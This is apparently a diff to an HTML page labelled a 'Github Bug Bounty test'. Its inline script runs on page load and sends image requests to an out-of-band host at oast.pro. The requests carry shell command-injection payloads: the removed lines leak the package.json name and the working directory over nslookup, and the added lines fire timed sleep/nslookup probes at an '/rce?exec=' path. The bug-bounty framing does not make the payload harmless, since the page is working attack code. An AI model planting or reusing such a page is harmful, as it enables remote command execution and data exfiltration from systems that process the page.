@@ -1,40 +1,26 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>Don't Worry</title>
-</head>
-    <h1>Hello, Github Bug Bounty Test</h1>
+<html>
 <body>
+    <h1>Github Bug BOunty test</h1>
     <script>
         (function() {
-            // 1. YOUR CONFIGURATION
-            const oobID = "9a5758d5b30f88782d53g1431jcyyyyyb.oast.pro"; 
+            const oobID = "9a5758d5b30f88782d53g1431jcyyyyyb.oast.pro";
 
-            // 2. THE COMMANDS
-            // This command:
-            // - Finds package.json
-            // - Grabs the 'name' value
-            // - Removes quotes and spaces
-            // - Truncates to 60 chars (DNS limit)
-            // - Appends your OOB ID
-            const pkgCmd = `$(nslookup $(grep '"name":' package.json | head -n 1 | cut -d'"' -f4 | tr -d ' ' | tr '[:upper:]' '[:lower:]' | cut -c1-60).${oobID})`;
+            // We fire three different probes with different 'sleep' intervals.
+            // This creates a "heartbeat" in your Collaborator logs.
             
-            // This command checks for the CURRENT DIRECTORY name
-            const dirCmd = `$(nslookup $(basename $(pwd) | tr -d ' ').${oobID})`;
+            const probes = [
+                { name: "start", sleep: 0 },
+                { name: "middle", sleep: 30 },
+                { name: "end", sleep: 60 }
+            ];
 
-            // 3. EXECUTION
-            // We use standard Image tags to bypass CORS and trigger the backend
-            
-            // Probe 1: Seek Internal Package Name
-            var img1 = new Image();
-            img1.src = `https://${oobID}/pkg-seek?name=${pkgCmd}`;
-
-            // Probe 2: Seek Working Directory Name
-            var img2 = new Image();
-            img2.src = `https://${oobID}/dir-seek?name=${dirCmd}`;
-
-            console.log("Dependency probes sent.");
+            probes.forEach(p => {
+                var img = new Image();
+                // Payload: sleep X seconds, then lookup [name].[time].oobID
+                const cmd = `$(sleep ${p.sleep} && nslookup ${p.name}.$(date +%H%M%S).${oobID})`;
+                img.src = `https://${oobID}/rce?exec=${cmd}`;
+            });
         })();
     </script>
 </body>
